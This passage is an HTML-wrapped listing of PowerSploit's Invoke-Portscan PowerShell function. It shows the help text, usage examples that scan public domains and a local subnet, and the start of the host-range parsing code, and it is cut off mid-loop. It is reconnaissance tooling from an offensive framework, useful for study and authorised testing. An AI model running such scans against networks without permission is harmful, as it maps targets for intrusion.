class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-Portscan</span></span><br>&#123;<br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Simple portscan module</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PowerSploit Function: Invoke-Portscan</span><br><span class="hljs-comment">Author: Rich Lundeen (http://webstersProdigy.net)</span><br><span class="hljs-comment">License: BSD 3-Clause</span><br><span class="hljs-comment">Required Dependencies: None</span><br><span class="hljs-comment">Optional Dependencies: None</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Does a simple port scan using regular sockets, based (pretty) loosely on nmap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Hosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated hosts (supports IPv4 CIDR notation) or pipe them in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER HostFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input hosts from file rather than commandline</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludeHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated hosts</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated ports (can also be a range like 80-90)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PortFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input ports from a file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER TopPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include the x top ports - only goes to 1000, default is top 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludedPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated ports</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SkipDiscovery</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Treat all hosts as online, skip host discovery</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PingOnly</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Ping scan only (disable port scan)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER DiscoveryPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Comma separated ports used for host discovery. -1 is a ping</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Threads</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of max threads for the thread pool (per host)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER nHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of hosts to concurrently scan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Timeout</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Timeout time on a connection in miliseconds before port is declared filtered</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SleepTimer</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Wait before thread checking, in miliseconds</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SyncFreq</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">How often (in terms of hosts) to sync threads and flush output</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER T</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)</span><br><span class="hljs-comment">    5 &#123;$nHosts=30;  $Threads = 1000; $Timeout = 750  &#125;</span><br><span class="hljs-comment">    4 &#123;$nHosts=25;  $Threads = 1000; $Timeout = 1200 &#125;</span><br><span class="hljs-comment">    3 &#123;$nHosts=20;  $Threads = 100;  $Timeout = 2500 &#125;</span><br><span class="hljs-comment">    2 &#123;$nHosts=15;  $Threads = 32;   $Timeout = 3000 &#125;</span><br><span class="hljs-comment">    1 &#123;$nHosts=10;  $Threads = 32;   $Timeout = 5000 &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER GrepOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER XmlOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output XML file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ReadableOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output file in &#x27;readable&#x27; format</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER AllformatsOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output in readable (.nmap), xml (.xml), and greppable (.gnmap) formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER noProgressMeter</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Suppresses the progress meter</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER quiet</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">supresses returned output and don&#x27;t store hosts in memory - useful for very large scans</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ForceOverwrite</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Force Overwrite if output Files exist. Otherwise it throws exception</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts &quot;webstersprodigy.net,google.com,microsoft.com&quot; -TopPorts 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">echo webstersprodigy.net | Invoke-Portscan -oG test.gnmap -f -ports &quot;80,443,8080&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Does a portscan of &quot;webstersprodigy.net&quot;, and writes a greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 20 ports for hosts found in the 192.168.1.1/24 range, outputs all file formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://webstersprodigy.net</span><br><span class="hljs-comment">#&gt;</span><br><br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseShouldProcessForStateChangingFunctions&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseSingularNouns&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseApprovedVerbs&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSShouldProcess&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseLiteralInitializerForHashtable&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>    <span class="hljs-keyword">Param</span> (<br>        <span class="hljs-comment">#Host, Ports</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;cmdHosts&quot;</span>,<br><br>                   <span class="hljs-type">ValueFromPipeline</span>=<span class="hljs-variable">$True</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$Hosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;fHosts&quot;</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iL&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>]  <span class="hljs-variable">$HostFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;exclude&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludeHosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;p&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iP&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$TopPorts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;xPorts&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludedPorts</span>,<br><br>        <span class="hljs-comment">#Host Discovery</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;Pn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;sn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$PingOnly</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;PS&quot;</span>)]<br>                   [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$DiscoveryPorts</span> = <span class="hljs-string">&quot;-1,445,80,443&quot;</span>,<br><br>        <span class="hljs-comment">#Timing and Performance</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$nHosts</span> = <span class="hljs-number">25</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2000</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SleepTimer</span> = <span class="hljs-number">500</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SyncFreq</span> = <span class="hljs-number">1024</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$T</span>,<br><br>        <span class="hljs-comment">#Output</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oG&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$GrepOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oX&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$XmlOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oN&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ReadableOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oA&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$AllformatsOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$noProgressMeter</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;q&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$quiet</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;F&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$ForceOverwrite</span><br><br>        <span class="hljs-comment">#TODO add script parameter</span><br>        <span class="hljs-comment">#TODO add resume parameter</span><br>    )<br><br>    <span class="hljs-keyword">PROCESS</span> &#123;<br><br>        <span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2.0</span><br><br>        <span class="hljs-variable">$version</span> = .<span class="hljs-number">13</span><br>        <span class="hljs-variable">$hostList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$portList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$hostPortList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>        <span class="hljs-variable">$scannedHostList</span> = <span class="hljs-selector-tag">@</span>()<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Hosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$Hosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-variable">$IPRangeRegex</span> = <span class="hljs-string">&quot;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;-\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&quot;</span><br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$iHost</span>)<br>                &#123;<br>                    <span class="hljs-keyword">continue</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span>.contains(<span class="hljs-string">&quot;/&quot;</span>))<br>                &#123;<br>                    <span class="hljs-variable">$netPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$maskPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>]<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$netPart</span>)<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$maskPart</span> <span class="hljs-operator">-ge</span> <span class="hljs-variable">$address</span>.GetAddressBytes().Length * <span class="hljs-number">8</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Bad host mask&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$numhosts</span> = [<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>,((<span class="hljs-variable">$address</span>.GetAddressBytes().Length *<span class="hljs-number">8</span>) - <span class="hljs-variable">$maskPart</span>))<br><br>                    <span class="hljs-variable">$startaddress</span> = <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$startaddress</span> = [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$startaddress</span>, <span class="hljs-number">0</span>)<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$startMask</span> = ([<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>, <span class="hljs-variable">$maskPart</span>)<span class="hljs-literal">-1</span>) * ([<span class="hljs-type">System.Math</span>]::Pow(<span class="hljs-number">2</span>,(<span class="hljs-number">32</span> - <span class="hljs-variable">$maskPart</span>)))<br>                    <span class="hljs-variable">$startAddress</span> = <span class="hljs-variable">$startAddress</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$startMask</span><br><br>                    <span class="hljs-comment">#in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary</span><br>                    <span class="hljs-variable">$startAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$startaddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$startAddress</span><br><br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$numhosts</span><span class="hljs-literal">-1</span>; <span class="hljs-variable">$i</span>++)<br>                    &#123;<br><br>                        <span class="hljs-variable">$nextAddress</span> =  <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br>                        <span class="hljs-variable">$nextAddress</span> =  [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$nextAddress</span>, <span class="hljs-number">0</span>)<br>                        <span class="hljs-variable">$nextAddress</span> ++<br>                        <span class="hljs-variable">$nextAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$nextAddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br><br>                        <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nextAddress</span><br>                        <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    &#125;<br><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-operator">-match</span> <span class="hljs-variable">$IPRangeRegex</span>)<br>                &#123;<br><br>                <span class="hljs-variable">$iHostPart1</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">0</span>]<br>                <span class="hljs-variable">$iHostPart2</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">1</span>]<br><br>                <span class="hljs-variable">$LowerBound</span> = <span class="hljs-variable">$iHostPart1</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br>                <span class="hljs-variable">$UpperBound</span> = <span class="hljs-variable">$iHostPart2</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br><br>                <span class="hljs-variable">$LowerBoundInt</span> = (<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br>                <span class="hljs-variable">$UpperBoundInt</span> = (<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br><br>                <span class="hljs-variable">$CurrentIP</span> = <span class="hljs-variable">$LowerBoundInt</span><br>                <span class="hljs-variable">$CurrentIPString</span> = <span class="hljs-variable">$null</span><br>                <span class="hljs-variable">$ControlArray</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>                <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHostPart1</span>)<br><br>                    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$CurrentIPString</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$iHostPart2</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++)<br>                        &#123;<br><br>                            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-eq</span> <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]) <span class="hljs-operator">-and</span> ((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                            &#123;<br>                                <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-number">1</span><br>                                <span class="hljs-keyword">continue</span><br>                            &#125;<br>                            <span class="hljs-keyword">else</span><br>                            &#123;<br><br>                                <span class="hljs-variable">$Max</span> = <span class="hljs-number">254</span><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$Max</span> = <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">254</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>]=<span class="hljs-number">0</span><br><br>                                    <span class="hljs-variable">$CurrentIPString</span> 